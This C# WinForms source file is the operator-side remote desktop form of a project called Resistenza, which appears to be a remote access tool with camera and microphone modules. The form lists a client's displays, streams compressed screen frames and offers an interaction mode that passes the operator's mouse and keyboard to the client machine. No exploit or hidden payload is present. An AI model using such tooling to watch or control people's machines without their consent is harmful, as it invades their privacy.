using NAudio.Wave;
using OpenCvSharp.Extensions;
using Resistenza.Common.Networking;
using Resistenza.Common.Packets.Camera;
using Resistenza.Common.Packets.Logic;
using Resistenza.Common.Packets.Microphone;
using Resistenza.Common.Packets;
using Resistenza.Common.Packets.Remote_Desktop;
using Resistenza.Server.Networking;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

using System.DirectoryServices.Protocols;
using System.Diagnostics;


using Timer = System.Timers.Timer;
using System.Runtime.InteropServices;
using OpenCvSharp;
using Point = System.Drawing.Point;
using System.IO.Compression;
using Org.BouncyCastle.Asn1.Cms;
using System.Drawing.Imaging;
using System.Text.RegularExpressions;



namespace Resistenza.Server.Forms
{
    public partial class FrmRemoteDesktop : Form
    {

        private ConnectedClient _Client;
        private Dictionary<string, MonitorDeviceInfo> _DevicesAvailable;
        private FullScreenDesktop _FullScreenDesktop;
        private int _Fps;
        private int _PreviousSecondFps;
        private readonly object _fpsCounterLock;
        private bool _IsFirstFrame;
        private Timer _FrameRateTimer;
        private bool _IsStreamingActive;
        private bool _IsStopRequested;
        private bool _IsInteractionActive;
        private bool _IsFullScreen;

        public FrmRemoteDesktop(ConnectedClient Client)
        {
            InitializeComponent();
            _Client = Client;
            _Client.IncomingPacket += _Client_IncomingPacket;

            string Loading = "Loading...";
            int In = DisplaysBox.Items.Add(Loading);
            DisplaysBox.Text = Loading;
            DisplaysBox.SelectedIndex = In;

            _IsFirstFrame = true;
            _IsStreamingActive = false;
            _IsStopRequested = false;
            _IsFullScreen = false;
            _fpsCounterLock = new object();

         

            //_DevicesAvailable = new Dictionary<string, MonitorDeviceInfo>();
        }
        

        private void _Client_IncomingPacket(object PacketReceived)
        {
            switch (PacketReceived)
            {
                case CancelRemoteOperationResponse:

                    if (((CancelRemoteOperationResponse)PacketReceived).TaskId == TasksIds.STREAM_DESKTOP_TASK_ID)
                    {
                        DesktopPictureBox.Image = null;
                        _IsStopRequested = false;
                    }
                    return;

                case DesktopListDisplaysResponse:

                    DesktopListDisplaysResponse displayPacket = (DesktopListDisplaysResponse)PacketReceived;
                    _DevicesAvailable = new Dictionary<string, MonitorDeviceInfo>();

                    Invoke(() =>
                    {
                        int loadingIndex = DisplaysBox.Items.IndexOf("Loading...");
                        if (loadingIndex != -1)
                            DisplaysBox.Items.RemoveAt(loadingIndex);
                    });

                    if (displayPacket.Devices == null || displayPacket.Devices.Count == 0)
                    {
                        Invoke(() =>
                        {
                            string noDisplay = "No Display Available";
                            int idx = DisplaysBox.Items.Add(noDisplay);
                            DisplaysBox.Text = noDisplay;
                            DisplaysBox.Enabled = false;

                        });
                        return;
                    }

                    int deviceCounter = 1;
                    foreach (var device in displayPacket.Devices)
                    {

                        string identifier = $"Display {deviceCounter} ({device.ScreenWidth}x{device.ScreenHeight})" +
                                            (device.IsMainMonitor ? " (Main display)" : "");

                        Invoke(() =>
                        {
                            int idx = DisplaysBox.Items.Add(identifier);
                            if (string.IsNullOrEmpty(DisplaysBox.Text))
                            {
                                DisplaysBox.Text = identifier;
                                DisplaysBox.SelectedIndex = idx;
                            }
                        });

                        deviceCounter++;
                    }
                    return;

                case DesktopFrameResponse:

                    if (!_IsStopRequested)
                    {
                        if (_IsFirstFrame)
                        {
                            _IsFirstFrame = false;
                            _Fps = 0;

                            lock (_fpsCounterLock)
                            {
                                _FrameRateTimer = new Timer(1000); //un secondo
                                _FrameRateTimer.Elapsed += OnFrameRateTimerElasped;
                                _FrameRateTimer.Start();
                            }
                            FrameRateLabel.Location = new Point(this.ClientSize.Width - 60, this.ClientSize.Height - 30);

                            FrameRateLabel.Visible = true;
                        }

                        DesktopFrameResponse FramePacket = (DesktopFrameResponse)PacketReceived;

                        using (var input = new MemoryStream(FramePacket.ScreenCapture))
                        using (var gzip = new GZipStream(input, CompressionMode.Decompress))
                        using (var output = new MemoryStream())
                        {
                            gzip.CopyTo(output);

                            Bitmap bitmapFrame = new Bitmap(FramePacket.Width, FramePacket.Height, System.Drawing.Imaging.PixelFormat.Format32bppArgb);
                            var rect = new Rectangle(0, 0, FramePacket.Width, FramePacket.Height);
                            BitmapData bmpData = bitmapFrame.LockBits(rect, ImageLockMode.WriteOnly, bitmapFrame.PixelFormat);

                            Marshal.Copy(output.ToArray(), 0, bmpData.Scan0, FramePacket.Height * FramePacket.Pitch);
                            bitmapFrame.UnlockBits(bmpData);

                            DesktopPictureBox.SizeMode = PictureBoxSizeMode.StretchImage;

                            if (_IsFullScreen)
                            {
                                _FullScreenDesktop.AddFrame(bitmapFrame);
                            }
                            else
                            {
                                DesktopPictureBox.Image = bitmapFrame;
                            }

                        }


                        _Fps++;
                    }

                    return;
            }

        }

        private void OnFrameRateTimerElasped(object? sender, System.Timers.ElapsedEventArgs e)
        {
            int currentFps;
            lock (_fpsCounterLock)
            {
                currentFps = _Fps;
                _Fps = 0;
            }
            Invoke(() => FrameRateLabel.Text = $"FPS: {currentFps}");
        }

        private async void FrmRemoteDesktop_Load(object sender, EventArgs e)
        {


            DesktopPictureBox.Left = (this.ClientSize.Width - DesktopPictureBox.Width) / 2;
            DesktopPictureBox.Top = ((this.ClientSize.Height - DesktopPictureBox.Height) / 2) - 20;

            StartWatchingButton.Top = DesktopPictureBox.Bottom + 40;
            StartWatchingButton.Left = DesktopPictureBox.Left + (DesktopPictureBox.Width - StartWatchingButton.Width) / 2;

            DesktopStartRequest ListRequest = new DesktopStartRequest
            {
                ListDevices = true
            };

            await _Client.CustomStream.SendPacketAsync(ListRequest);


        }

        private async void StartWatchingButton_Click(object sender, EventArgs e)
        {

            if (!_IsStreamingActive)
            {

                StartWatchingButton.Text = "Stop watching";
                StartWatchingButton.Location = new Point(150, StartWatchingButton.Location.Y);
                FullScreenBtn.Location = new Point(this.Size.Width - (150 + StartWatchingButton.Size.Width), StartWatchingButton.Location.Y);

                DesktopStartRequest StartStreamingRequest = new DesktopStartRequest
                {
                    StartTransmit = true,
                    MonitorIndex = Int32.Parse(DisplaysBox.SelectedItem.ToString().Split(' ')[1]) - 1
                };

                await _Client.CustomStream.SendPacketAsync(StartStreamingRequest);

                FullScreenBtn.Visible = true;
                _IsStreamingActive = true;



            }
            else
            {
                DesktopPictureBox.Image = null;
                _IsStopRequested = true;

                var StopStreamingRequest = new CancelRemoteOperationRequest()
                {
                    TaskId = TasksIds.STREAM_DESKTOP_TASK_ID

                };
                await _Client.CustomStream.SendPacketAsync(StopStreamingRequest);

                FullScreenBtn.Visible = false;


                StartWatchingButton.Left = DesktopPictureBox.Left + (DesktopPictureBox.Width - StartWatchingButton.Width) / 2;

                DeactivateFullScreen();
                StartWatchingButton.Text = "Start watching";
                FrameRateLabel.Visible = false;
                _IsStreamingActive = false;
                _IsFirstFrame = true;
            }
        }

     
        private void DesktopPictureBox_Click(object sender, EventArgs e)
        {

        }

        private void DesktopPictureBox_DoubleClick(object sender, EventArgs e)
        {
            if (!_IsFullScreen)
            {
                ActivateFulLScreen();
                FullScreenBtn.Text = "Full screen: On";
            }
        }

        private void ActivateFulLScreen()
        {

            var SelectedMonitorInfo = new MonitorDeviceInfo
            {
                MonitorName = DisplaysBox.SelectedItem.ToString(),

            };

            var match = Regex.Match(SelectedMonitorInfo.MonitorName, @"\((\d+)x(\d+)\)");   
            SelectedMonitorInfo.ScreenWidth = int.Parse(match.Groups[1].Value);
            SelectedMonitorInfo.ScreenHeight= int.Parse(match.Groups[2].Value);

          
            _FullScreenDesktop = new FullScreenDesktop(_Client, SelectedMonitorInfo) ;
            _IsFullScreen = true;
            _FullScreenDesktop.FormClosed += _FullScreenDesktop_FormClosed;

            InteractionPictureBox.Top = DesktopPictureBox.Top + 10;
            InteractionPictureBox.Left = DesktopPictureBox.Left + 10;
            InteractionPictureBox.Visible = true;

            DesktopPictureBox.Image = null;


            _FullScreenDesktop.Show();
        }

        private void DeactivateFullScreen(bool CloseForm = false)
        {
            
            InteractionPictureBox.Visible = false;
            _IsFullScreen = false;
            FullScreenBtn.Text = "Full screen: Off";

            if (CloseForm)
            {
                _FullScreenDesktop?.Close(); // se viene chiamato dall'handler che gestisce la chiusura del form ovvero lo user ha cliccato la x allora si chiudera automaticamente, ma se viene chiuso tramite pulsante allora bisogna chiuderlo manualmente
            }
        }

        private void _FullScreenDesktop_FormClosed(object? sender, FormClosedEventArgs e)
        {
            DeactivateFullScreen();
        }

        private void FullScreenBtn_Click(object sender, EventArgs e)
        {
            if (!_IsFullScreen)
            {
                ActivateFulLScreen();
                FullScreenBtn.Text = "Full screen: On";
            }
            else
            {
                DeactivateFullScreen(true);
            }
        }

        private async void InteractionPictureBox_Click(object sender, EventArgs e)
        {

            if (_IsInteractionActive)
            {
                InteractionPictureBox.Image = Resistenza.Server.Properties.Resources.mouse_clicker;
                _IsInteractionActive = false;
                _FullScreenDesktop.StopInteractionMode();

                GenericNotificationLabel.Text = "";
                GenericNotificationLabel.Visible = false;
            }
            else
            {
                GenericNotificationLabel.Location = new Point(10, this.ClientSize.Height - 30);
                GenericNotificationLabel.Text = "Interactione mode activated! Your mouse and keyboard are hooked to the client device, click the icon again to disable!";
                GenericNotificationLabel.Visible = true;

                InteractionPictureBox.Image = Resistenza.Server.Properties.Resources.no_mouse_clicker;

                _FullScreenDesktop.StartInteractionMode();

                _IsInteractionActive = true;
            }

            

            
        }
    }
}
